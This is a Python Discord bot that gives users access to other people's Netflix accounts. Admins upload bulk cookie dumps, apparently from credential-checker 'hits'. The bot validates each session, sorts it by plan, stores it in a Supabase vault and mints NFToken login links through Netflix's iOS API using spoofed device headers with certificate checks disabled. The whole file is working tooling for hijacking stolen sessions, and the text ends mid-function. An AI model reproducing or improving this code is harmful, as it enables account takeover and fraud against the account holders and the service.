import asyncio
import html
import http.server
import io
import json
import os
import re
import sys
import threading
import unicodedata
import zipfile
from datetime import datetime, timezone

import discord
import requests
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
from urllib3.exceptions import InsecureRequestWarning

load_dotenv()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==========================================
# FAKE PORT SERVER  (keeps Render alive)
# ==========================================

def _start_fake_server():
    """
    Spin up a minimal HTTP server so Render (and similar platforms) see a
    live web-service port and never kill the process for 'no open port'.
    Listens on $PORT (default 10000).  Runs in a daemon thread — invisible
    to the Discord bot logic.
    """
    port = int(os.environ.get("PORT", "10000"))

    class _Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = b"OK"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass  # silence access-log noise

    server = http.server.HTTPServer(("0.0.0.0", port), _Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[KeepAlive] Fake HTTP server listening on port {port}")

_start_fake_server()

# ==========================================
# CHANNEL IDs  (set in .env or Replit Secrets)
# ==========================================

def _int_env(key: str) -> int:
    try:
        return int(os.environ.get(key, "0") or "0")
    except (ValueError, TypeError):
        return 0

ADMIN_CHANNEL_ID = _int_env("ADMIN_CHANNEL_ID")
FGEN_CHANNEL_ID  = _int_env("FGEN_CHANNEL_ID")
BGEN_CHANNEL_ID  = _int_env("BGEN_CHANNEL_ID")
PGEN_CHANNEL_ID  = _int_env("PGEN_CHANNEL_ID")

# ==========================================
# 1. SUPABASE CLOUD DATABASE
# ==========================================

class CloudDB:
    """Single-row Supabase vault — all Netflix cookies in one JSON blob."""

    def __init__(self, url: str, key: str):
        raw = str(url or "").strip().rstrip("/")
        for suffix in ["/rest/v1/vault", "/rest/v1"]:
            if raw.endswith(suffix):
                raw = raw[: -len(suffix)]
        self.endpoint = f"{raw}/rest/v1/vault?id=eq.1"
        self.headers = {
            "apikey":        str(key or "").strip(),
            "Authorization": f"Bearer {str(key or '').strip()}",
            "Content-Type":  "application/json",
            "Prefer":        "return=representation",
        }

    def _ensure(self, data: dict) -> dict:
        if "nf" not in data or not isinstance(data["nf"], dict):
            data["nf"] = {}
        for t in ("free", "booster", "premium"):
            if t not in data["nf"] or not isinstance(data["nf"][t], list):
                data["nf"][t] = []
        return data

    def get_all(self) -> dict:
        try:
            r = requests.get(self.endpoint, headers=self.headers, timeout=15)
            if r.status_code == 200:
                rows = r.json()
                if rows:
                    raw = rows[0].get("data", {})
                    return self._ensure(raw if isinstance(raw, dict) else {})
            else:
                print(f"[DB] Read error HTTP {r.status_code}: {r.text[:200]}")
        except Exception as e:
            print(f"[DB] Read failed: {e}")
        return self._ensure({})

    def save(self, data: dict) -> bool:
        try:
            r = requests.patch(
                self.endpoint, headers=self.headers,
                json={"data": data}, timeout=20,
            )
            if r.status_code in (200, 204):
                print("[DB] Synced to Supabase.")
                return True
            print(f"[DB] Write error HTTP {r.status_code}: {r.text[:200]}")
        except Exception as e:
            print(f"[DB] Write failed: {e}")
        return False

    def pop_cookie(self, tier: str) -> str | None:
        data = self.get_all()
        lst  = data["nf"].get(tier, [])
        if not lst:
            return None
        cookie = lst.pop(0)
        self.save(data)
        return cookie

    def push_cookies(self, tier: str, cookies: list[str]) -> None:
        if not cookies:
            return
        data = self.get_all()
        data["nf"][tier].extend(cookies)
        self.save(data)

    def stock(self) -> dict[str, int]:
        data = self.get_all()
        return {t: len(data["nf"].get(t, [])) for t in ("free", "booster", "premium")}

    def existing_netflix_ids(self) -> set[str]:
        """Return a set of all NetflixId values already stored in the vault."""
        data = self.get_all()
        ids: set[str] = set()
        for tier in ("free", "booster", "premium"):
            for cookie_text in data["nf"].get(tier, []):
                nid = netscape_to_dict(cookie_text).get("NetflixId", "").strip()
                if nid:
                    ids.add(nid)
        return ids


db = CloudDB(
    url=os.environ.get("SUPABASE_URL", ""),
    key=os.environ.get("SUPABASE_KEY", ""),
)

# ==========================================
# 2. COOKIE UTILITIES
# ==========================================

def _decode(value) -> str | None:
    if value is None:
        return None
    s = html.unescape(str(value))
    for src, tgt in {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " "}.items():
        s = s.replace(src, tgt)
    s = s.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        prev = s
        s = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)
        s = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), s)
        s = s.replace("\\\\", "\\")
        if s == prev:
            break
    return re.sub(r"\s+", " ", s).strip() or None


def netscape_to_dict(text: str) -> dict:
    out: dict = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            out[parts[5]] = parts[6]
    return out


def _to_netscape(raw: str) -> str:
    try:
        parsed = json.loads(raw)
        if isinstance(parsed, dict):
            parsed = parsed.get("cookies", parsed.get("items", parsed))
        if isinstance(parsed, list):
            lines = []
            for c in parsed:
                domain  = str(c.get("domain", ""))
                path    = str(c.get("path", "/"))
                tail    = "TRUE" if domain.startswith(".") else "FALSE"
                secure  = "TRUE" if c.get("secure", False) else "FALSE"
                expires = str(int(float(c.get("expirationDate", c.get("expires", 0)))))
                lines.append(
                    f"{domain}\t{tail}\t{path}\t{secure}\t{expires}"
                    f"\t{c.get('name','')}\t{c.get('value','')}"
                )
            return "\n".join(lines)
    except Exception:
        pass
    clean = [l.strip() for l in raw.splitlines() if l.strip() and len(l.split("\t")) >= 7]
    return "\n".join(clean)


def parse_cookie_file(raw: str) -> list[str]:
    """Return individual Netscape blocks from a bulk upload. Netflix only."""
    lo = raw.lower()
    if "netflix.com" not in lo and "netflixid" not in lo:
        return []

    accounts: list[str] = []

    # JSON array-of-arrays
    try:
        parsed = json.loads(raw)
        if isinstance(parsed, list) and parsed and isinstance(parsed[0], list):
            for acc in parsed:
                c = _to_netscape(json.dumps(acc))
                if c:
                    accounts.append(c)
            return accounts
    except Exception:
        pass

    # Split on blank lines / checker separators
    for block in re.split(r"\n\s*\n|NETFLIX HIT|Checker By: INFOGAMER", raw):
        c = _to_netscape(block)
        if c and len(c.splitlines()) >= 2:
            accounts.append(c)

    if not accounts:
        c = _to_netscape(raw)
        if c:
            accounts.append(c)

    return accounts

# ==========================================
# 3. NETFLIX COOKIE CHECKER
# ==========================================

def normalize_plan_key(value: str | None) -> str:
    """Unicode-normalize a status/plan string to a stable underscore key."""
    if not value:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", str(value))
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def _rx(text: str, *patterns: str, flags: int = 0) -> str | None:
    """Return first regex capture from text, decoded. Patterns tried in order."""
    for pat in patterns:
        m = re.search(pat, text, flags)
        if m:
            return _decode(m.group(1))
    return None


def _extract_graphql_info(text: str) -> dict:
    """
    Fast path: try to parse the response as raw GraphQL JSON.
    Netflix occasionally returns pure JSON — works when that happens.
    """
    try:
        payload = json.loads(text)
        if not isinstance(payload, dict):
            return {}
        data   = payload.get("data") or {}
        growth = data.get("growthAccount") or {}
        plan   = ((growth.get("currentPlan") or {}).get("plan") or {})
        next_p = ((growth.get("nextPlan") or {}).get("plan") or {})
        return {
            "membershipStatus": _decode(growth.get("membershipStatus")),
            "plan":       _decode(plan.get("name") or next_p.get("name")),
            "quality":    _decode(plan.get("videoQuality") or next_p.get("videoQuality")),
            "country":    _decode((growth.get("countryOfSignUp") or {}).get("code")),
            "maxStreams":  _decode(growth.get("maxStreams")),
        }
    except Exception:
        return {}


def _extract_html_info(text: str) -> dict:
    """
    Fallback path: Netflix's HTML page has JSON fragments embedded inside.
    Extract every field we need via regex directly on the raw HTML.
    """
    DOT = re.DOTALL
    return {
        "membershipStatus": _rx(text,
            r'"membershipStatus"\s*:\s*"([^"]+)"',
        ),
        "plan": _rx(text,
            r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
            r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"localizedPlanName"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"',
            flags=DOT,
        ),
        "quality": _rx(text,
            r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"videoQuality"\s*:\s*"([^"]+)"',
            r'"quality"\s*:\s*"([^"]+)"',
        ),
        "country": _rx(text,
            r'"currentCountry"\s*:\s*"([^"]+)"',
            r'"countryOfSignup"\s*:\s*"([^"]+)"',
            r'"countryOfSignUp"\s*:\s*\{\s*"code"\s*:\s*"([^"]+)"',
        ),
        "maxStreams": _rx(text,
            r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,}]+)',
            r'"maxStreams"\s*:\s*"?([^",}\s]+)"?',
        ),
    }


# Extra-member page markers (multiple languages, from reference)
_EXTRA_MEMBER_PATTERNS = (
    r"extra\s+on\s+someone.?else.?s\s+plan",
    r"assinante\s+extra\s+no\s+plano",
    r"suscriptor\s+extra\s+en\s+el\s+plan",
    r"abbonato\s+extra\s+sul\s+piano",
    r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait",
    r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
)

# Strings present on Netflix's login page (dead / expired cookie).
# NOTE: '"login"' and '"authURL"' were intentionally removed — they appear
# inside JavaScript bundles on valid /account pages and caused false positives
# (live cookies being flagged as dead).  The four markers below are unique to
# the rendered login form and do NOT appear on authenticated account pages.
_LOGIN_PAGE_MARKERS = (
    "LoginForm",
    "login-form",
    "password-input",
    "sign-in-form",
)


def _is_login_page(url: str, text: str) -> bool:
    """Return True if Netflix redirected us to the login / sign-in page.

    Changes vs original:
    - URL check is now exact-segment only (/login, /login?, /loginhelp, /signup)
      to avoid false matches on paths like /account/login-history.
    - Text-marker threshold raised to 2 out of the 4 high-confidence markers
      (the generic '"login"' and '"authURL"' markers were removed because they
      appear on valid account pages inside embedded JS bundles).
    - The entire check is skipped by check_nf_cookie() when membershipStatus
      was already successfully extracted — guaranteeing no false positives for
      live cookies whose pages happen to contain login-related JS fragments.
    """
    url_lower = url.lower()
    # Only flag as login page for unambiguous login/signup URL segments
    login_url_segments = ("/login", "/loginhelp", "/signup")
    for seg in login_url_segments:
        # Match /login at end-of-path or followed by ? or /
        if re.search(re.escape(seg) + r"(?:[/?#]|$)", url_lower):
            return True
    # Require at least 2 of the high-confidence form markers
    return sum(1 for m in _LOGIN_PAGE_MARKERS if m in text) >= 2


def _is_subscribed(info: dict) -> bool:
    """
    Return True when the account has an active subscription.
    Covers: current members, on-hold/past-due accounts, extra-member accounts.
    """
    status_key = normalize_plan_key(info.get("membershipStatus"))
    if status_key == "current_member":
        return True
    # On-hold / past-due accounts still have a valid plan
    if any(tok in status_key for tok in ("hold", "past_due", "payment_retry", "paused", "suspend")):
        return True
    if info.get("isExtraMember"):
        return True
    return False


def check_nf_cookie(cookie_text: str) -> dict:
    cookies = netscape_to_dict(cookie_text)
    if "NetflixId" not in cookies:
        return {"ok": False, "reason": "Missing NetflixId cookie."}

    s = requests.Session()
    s.cookies.update(cookies)
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        # Force uncompressed response — keeps the raw HTML readable for regex
        "Accept-Encoding": "identity",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        r = s.get("https://www.netflix.com/account/membership",
                  headers=headers, timeout=20, allow_redirects=True)
    except requests.exceptions.Timeout:
        return {"ok": False, "reason": "Request timed out."}
    except Exception as e:
        return {"ok": False, "reason": str(e)}

    if r.status_code != 200:
        return {"ok": False, "reason": f"HTTP {r.status_code}"}

    text = r.text

    # ── Step 1: GraphQL fast path (works when page returns pure JSON) ────────
    info = _extract_graphql_info(text)

    # ── Step 2: HTML regex fallback — always run & merge to fill any gaps ────
    html_info = _extract_html_info(text)
    for k, v in html_info.items():
        if v and not info.get(k):
            info[k] = v

    # ── Step 3: Extra-member detection via page text ──────────────────────────
    if any(re.search(p, text, re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
        info["isExtraMember"] = True

    # ── Dead-cookie check — only run when we found NO account data ───────────
    # If membershipStatus was extracted, the cookie is clearly alive; skipping
    # the login-page check here prevents false positives from JS fragments.
    if not info.get("membershipStatus") and not info.get("isExtraMember"):
        if _is_login_page(r.url, text):
            return {"ok": False, "reason": "Cookie expired (redirected to login)."}

    if _is_subscribed(info):
        # ── Final gate: NFToken must be extractable ───────────────────────────
        # A cookie is only considered truly valid if we can obtain an NFToken
        # from the Netflix iOS API — because the bot needs the token to generate
        # login links.  Cookies that pass the membership check but have a dead
        # session on the mobile API are silently filtered out here.
        nft, nft_err = create_nftoken(cookie_text, attempts=2)
        if not nft:
            return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
        return {
            "ok":        True,
            "plan":      info.get("plan") or "Unknown",
            "quality":   info.get("quality") or "Unknown",
            "country":   info.get("country") or "Unknown",
            "maxStreams": info.get("maxStreams"),
            "status":    info.get("membershipStatus"),
            # Pre-fetched token — reused by _generate to avoid a second API call
            "nft":       nft,
        }

    # Valid cookie but no active subscription
    if info.get("membershipStatus"):
        return {"ok": False, "reason": f"No active subscription ({info['membershipStatus']})."}

    # membershipStatus absent entirely → cookie is dead / session gone
    return {"ok": False, "reason": "Cookie dead or session expired."}


# Netflix actual quality values: UHD=4K, HIGH=1080p, MEDIUM=720p, LOW=480p
_PREMIUM_PLAN_KEYS = {
    "premium", "premium_extra_member", "extra_member_premium",
    "cao_cap", "ozel", "프리미엄", "プレミアム",
}
_BOOSTER_PLAN_KEYS = {
    "standard", "standard_with_ads", "standard_with_adverts",
    "estandar", "estandar_con_anuncios", "padrao", "standaard",
    "standardowy", "standardowy_z_reklamami", "standar", "standart",
    "スタンダード", "스탠다드",
}


def classify_tier(plan: str, quality: str) -> str:
    """Map Netflix plan name + quality string to our three tiers."""
    key_p = normalize_plan_key(plan or "")
    q_up  = (quality or "").upper()

    # UHD quality → always premium
    if q_up in ("UHD", "4K") or "UHD" in q_up or "4K" in q_up:
        return "premium"

    # Plan-key exact match
    if key_p in _PREMIUM_PLAN_KEYS or "premium" in key_p:
        return "premium"
    if key_p in _BOOSTER_PLAN_KEYS or "standard" in key_p:
        return "booster"

    # Netflix quality "HIGH" = 1080p → booster; "MEDIUM"/"LOW" → free
    if q_up == "HIGH" or "1080" in q_up or "FHD" in q_up:
        return "booster"

    return "free"


def extract_cookies_from_zip(zip_bytes: bytes) -> tuple[list[str], list[str]]:
    """
    Open a ZIP archive from raw bytes — fully recursive (all folders/subfolders).
    Returns (accounts, file_summary_lines).
    """
    accounts: list[str] = []
    summary:  list[str] = []
    try:
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            # namelist() already returns every file in every subfolder
            inner_files = [
                n for n in zf.namelist()
                if not n.endswith("/")                              # skip dir entries
                and n.lower().endswith((".txt", ".json"))           # cookie files only
                and not os.path.basename(n).startswith(".")        # skip hidden
            ]
            if not inner_files:
                summary.append("(no .txt/.json files found inside zip)")
                return accounts, summary
            for name in inner_files:
                try:
                    raw = zf.read(name).decode("utf-8", errors="ignore")
                except Exception as e:
                    summary.append(f"`{name}` — read error: {e}")
                    continue
                found = parse_cookie_file(raw)
                accounts.extend(found)
                # Show full inner path so files in different subfolders are distinguishable
                summary.append(f"`{name}` ({len(found)} cookies)")
    except zipfile.BadZipFile:
        summary.append("(invalid or corrupted zip file)")
    except Exception as e:
        summary.append(f"(zip error: {e})")
    return accounts, summary


# ==========================================
# 4. NFTOKEN EXTRACTION & LINK GENERATION
# ==========================================

_NF_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

_NF_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}

_NF_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _expiry_str(expires) -> str | None:
    if expires is None:
        return None
    try:
        ts = int(expires)
        if ts > 1_000_000_000_000:
            ts //= 1000
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    except Exception:
        return str(expires)


def create_nftoken(cookie_text: str, attempts: int = 3) -> tuple[dict | None, str | None]:
    """
    Call Netflix iOS API to obtain an NFToken.
    Returns ({"token": str, "expires_at_utc": str|None}, None) on success,
    or (None, error_string) on failure.
    """
    nid = _decode(netscape_to_dict(cookie_text).get("NetflixId"))
    if not nid:
        return None, "Missing NetflixId — cannot create NFToken."

    headers = {**_NF_HEADERS, "Cookie": f"NetflixId={nid}"}
    last_err = "NFToken API error"

    for _ in range(max(1, attempts)):
        try:
            r = requests.get(_NF_API_URL, params=_NF_PARAMS, headers=headers,
                             timeout=30, verify=False)
            if r.status_code == 403:
                return None, "NetflixId rejected (403) — may be region-locked."
            if r.status_code == 429:
                return None, "Rate-limited by Netflix iOS API (429). Try later."
            if r.status_code != 200:
                last_err = f"NFToken API returned HTTP {r.status_code}."
                continue

            node = (
                (((r.json().get("value") or {}).get("account") or {})
                 .get("token") or {}).get("default") or {}
            )
            token = _decode(node.get("token"))
            if token:
                return {"token": token, "expires_at_utc": _expiry_str(node.get("expires"))}, None

            last_err = "Token field missing in API response."

        except requests.exceptions.Timeout:
            last_err = "NFToken request timed out."
        except requests.exceptions.ConnectionError:
            last_err = "NFToken API connection error."
        except Exception as e:
            last_err = f"Unexpected error: {e}"

    return None, last_err


def build_links(token: str) -> list[tuple[str, str]]:
    t = _decode(token)
    if not t:
        return []
    return [
        ("🖥️ PC Login",     f"https://netflix.com/?nftoken={t}"),
        ("📱 Mobile Login", f"https://netflix.com/unsupported?nftoken={t}"),
    ]

# ==========================================
# 5. CHANNEL GUARD
# ==========================================

def in_channel(channel_id: int):
    def predicate(interaction: discord.Interaction) -> bool:
        if channel_id == 0:
            return True
        if interaction.channel_id != channel_id:
            raise app_commands.CheckFailure(f"❌ Use this command in <#{channel_id}>.")
        return True
    return app_commands.check(predicate)

# ==========================================
# 6. GENERATOR COG
# ==========================================

class GeneratorCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    async def _generate(
        self, interaction: discord.Interaction,
        tier: str, label: str, emoji: str,
    ) -> None:
        await interaction.response.defer(ephemeral=True)
        loop = asyncio.get_running_loop()

        for attempt in range(5):
            # ── 1. Pop cookie ─────────────────────────────────────────
            cookie = await loop.run_in_executor(None, db.pop_cookie, tier)
            if not cookie:
                await interaction.followup.send(
                    f"❌ No **{label}** Netflix accounts in stock. Check back later!",
                    ephemeral=True,
                )
                return

            # ── 2. Validate + NFToken (combined — check_nf_cookie now gates on NFToken) ──
            check = await loop.run_in_executor(None, check_nf_cookie, cookie)
            if not check["ok"]:
                print(f"[Gen] Dead {tier} cookie (attempt {attempt+1}): {check.get('reason')}")
                continue

            # ── 3. Reuse pre-fetched NFToken from the check result ────────────
            nft = check.get("nft")

            # ── 4. Build response ─────────────────────────────────────
            embed = discord.Embed(
                title=f"{emoji} {label} Netflix — Generated!",
                color=discord.Color.red(),
            )
            embed.add_field(name="📋 Plan",    value=check.get("plan", "Unknown"),           inline=True)
            embed.add_field(name="🎬 Quality", value=(check.get("quality") or "").title(),   inline=True)
            embed.add_field(name="🌍 Country", value=check.get("country", "Unknown"),        inline=True)

            if nft:
                links = build_links(nft["token"])
                embed.add_field(
                    name="🔗 Login Links",
                    value="\n".join(f"[{lbl}]({url})" for lbl, url in links),
                    inline=False,
                )
                embed.add_field(
                    name="⏰ Link Expires",
                    value=nft.get("expires_at_utc") or "Unknown",
                    inline=False,
                )
                embed.set_footer(text="Links are one-time use — open immediately.")
                content = "\n".join(f"**{lbl}:** <{url}>" for lbl, url in links)
            else:
                embed.add_field(
                    name="⚠️ NFToken Unavailable",
                    value="Direct link unavailable. Import the raw cookie manually.",
                    inline=False,
                )
                content = f"```\n{cookie[:1800]}\n```"

            await interaction.followup.send(content=content, embed=embed, ephemeral=True)
            return

        await interaction.followup.send(
            "❌ All available cookies were expired. Ask an admin to `/restock`!",
            ephemeral=True,
        )

    # ── generation commands ────────────────────────────────────────────

    @app_commands.command(name="fgen", description="🆓 Generate a Free Netflix account")
    @in_channel(FGEN_CHANNEL_ID)
    @app_commands.checks.cooldown(1, 86400, key=lambda i: i.user.id)
    async def fgen(self, interaction: discord.Interaction):
        await self._generate(interaction, "free", "Free", "🆓")

    @app_commands.command(name="bgen", description="🚀 Generate a Booster Netflix account")
    @in_channel(BGEN_CHANNEL_ID)
    @app_commands.checks.cooldown(1, 28800, key=lambda i: i.user.id)
    async def bgen(self, interaction: discord.Interaction):
        await self._generate(interaction, "booster", "Booster", "🚀")

    @app_commands.command(name="pgen", description="💎 Generate a Premium Netflix account")
    @in_channel(PGEN_CHANNEL_ID)
    @app_commands.checks.cooldown(1, 21600, key=lambda i: i.user.id)
    async def pgen(self, interaction: discord.Interaction):
        await self._generate(interaction, "premium", "Premium", "💎")

    # ── admin: restock ─────────────────────────────────────────────────

    @app_commands.command(
        name="restock",
        description="[ADMIN] Upload up to 5 files (.txt/.json/.zip) — auto-extracted, checked & sorted",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @in_channel(ADMIN_CHANNEL_ID)
    async def restock(
        self,
        interaction: discord.Interaction,
        file1: discord.Attachment,
        file2: discord.Attachment | None = None,
        file3: discord.Attachment | None = None,
        file4: discord.Attachment | None = None,
        file5: discord.Attachment | None = None,
    ):
        await interaction.response.defer(ephemeral=True)

        attachments = [f for f in (file1, file2, file3, file4, file5) if f is not None]

        ALLOWED = (".txt", ".json", ".zip")
        bad = [f.filename for f in attachments
               if not f.filename.lower().endswith(ALLOWED)]
        if bad:
            return await interaction.followup.send(
                f"❌ Only `.txt` / `.json` / `.zip` files accepted. Rejected: {', '.join(bad)}",
                ephemeral=True,
            )

        all_accounts: list[str] = []
        file_names:   list[str] = []

        for att in attachments:
            try:
                raw_bytes = await att.read()
            except Exception as e:
                return await interaction.followup.send(
                    f"❌ Could not read `{att.filename}`: {e}", ephemeral=True
                )

            if att.filename.lower().endswith(".zip"):
                # ── ZIP: extract every .txt/.json inside ──
                found, inner_summary = extract_cookies_from_zip(raw_bytes)
                all_accounts.extend(found)
                inner_lines = "\n  ".join(inner_summary) if inner_summary else "(empty)"
                file_names.append(
                    f"`{att.filename}` → {len(found)} cookies\n  {inner_lines}"
                )
            else:
                # ── Plain text / JSON cookie file ──
                raw = raw_bytes.decode("utf-8", errors="ignore")
                found = parse_cookie_file(raw)
                all_accounts.extend(found)
                file_names.append(f"`{att.filename}` ({len(found)} cookies)")

        if not all_accounts:
            return await interaction.followup.send(
                "❌ No valid Netflix cookies found in any uploaded file.",
                ephemeral=True,
            )

        await interaction.followup.send(
            f"⏳ Scanning **{len(all_accounts)}** cookie(s) from **{len(attachments)}** file(s)… Please wait.",
            ephemeral=True,
        )

        loop = asyncio.get_running_loop()

        # ── Step 1: fetch vault IDs and pre-dedup the whole batch ──────────
        existing_ids: set[str] = await loop.run_in_executor(None, db.existing_netflix_ids)
        seen_ids:     set[str] = set(existing_ids)
        unique:       list[str] = []
        dupes = 0
        for cookie in all_accounts:
            nid = netscape_to_dict(cookie).get("NetflixId", "").strip()
            if nid and nid in seen_ids:
                dupes += 1
            else:
                unique.append(cookie)
                if nid:
                    seen_ids.add(nid)   # block intra-batch dupes too

        # ── Step 2: check all unique cookies IN PARALLEL (10 at a time) ────
        # 10 concurrent HTTP requests → ~10× faster than sequential
        SEM = asyncio.Semaphore(10)

        async def _check(cookie: str) -> dict:
            async with SEM:
                return await loop.run_in_executor(None, check_nf_cookie, cookie)

        results = await asyncio.gather(*[_check(c) for c in unique])

        sorted_: dict[str, list[str]] = {"free": [], "booster": [], "premium": []}
        dead = 0
        for cookie, res in zip(unique, results):
            if res["ok"]:
                tier = classify_tier(res.get("plan", ""), res.get("quality", ""))
                sorted_[tier].append(cookie)
            else:
                dead += 1

        data = await loop.run_in_executor(None, db.get_all)
        for t in ("free", "booster", "premium"):
            data["nf"][t].extend(sorted_[t])
        ok = await loop.run_in_executor(None, db.save, data)

        # Truncate file list if too long for Discord embed
        files_value = "\n".join(file_names)
        if len(files_value) > 900:
            files_value = files_value[:900] + "\n…"

        total_added = sum(len(v) for v in sorted_.values())
        embed = discord.Embed(
            title="✅ Restock Complete — Auto-sorted",
            color=discord.Color.green() if ok else discord.Color.orange(),
        )
        embed.add_field(name="📂 Files",           value=files_value,                    inline=False)
        embed.add_field(name="💎 Premium Added",   value=f"`{len(sorted_['premium'])}`", inline=True)
        embed.add_field(name="🚀 Booster Added",   value=f"`{len(sorted_['booster'])}`", inline=True)
        embed.add_field(name="🆓 Free Added",      value=f"`{len(sorted_['free'])}`",    inline=True)
        embed.add_field(name="💀 Dead Filtered",   value=f"`{dead}`",                    inline=True)
        embed.add_field(name="♻️ Duplicates Skipped", value=f"`{dupes}`",               inline=True)
        embed.add_field(name="📊 Total Scanned",   value=f"`{len(all_accounts)}`",       inline=True)
        if not ok:
            embed.add_field(name="⚠️ Warning", value="Supabase write may have failed.", inline=False)
        await interaction.channel.send(embed=embed)

    # ── admin: stock ───────────────────────────────────────────────────

    @app_commands.command(name="stock", description="📦 Check Netflix account stock levels")
    @in_channel(ADMIN_CHANNEL_ID)
    async def stock(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        counts = await asyncio.get_running_loop().run_in_executor(None, db.stock)

        embed = discord.Embed(title="📦 Netflix Account Vault", color=discord.Color.dark_theme())
        for label, key in [("💎 Premium", "premium"), ("🚀 Booster", "booster"), ("🆓 Free", "free")]:
            c = counts[key]
            embed.add_field(
                name=label,
                value=f"{'🟢' if c > 0 else '🔴'} **{c}** account(s)",
                inline=False,
            )
        embed.set_footer(text=f"Total: {sum(counts.values())} accounts")
        await interaction.followup.send(embed=embed, ephemeral=True)


# ==========================================
# 7. BOT CLASS
# ==========================================

class NetflixBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)
        self.tree.on_error = self._on_error

    async def setup_hook(self):
        await self.add_cog(GeneratorCog(self))
        # ── Always wipe global commands first so ghost commands never linger ──
        # Ghost commands appear when the bot previously synced globally and now
        # syncs to a guild (or vice-versa). Clearing + syncing both scopes on
        # every startup guarantees a clean slate regardless of prior state.
        self.tree.clear_commands(guild=None)
        await self.tree.sync()
        print("[Bot] Global commands cleared.")

        guild_id = os.environ.get("DISCORD_GUILD_ID", "").strip()
        if guild_id:
            try:
                g = discord.Object(id=int(guild_id))
                self.tree.clear_commands(guild=g)
                await self.tree.sync(guild=g)
                self.tree.copy_global_to(guild=g)
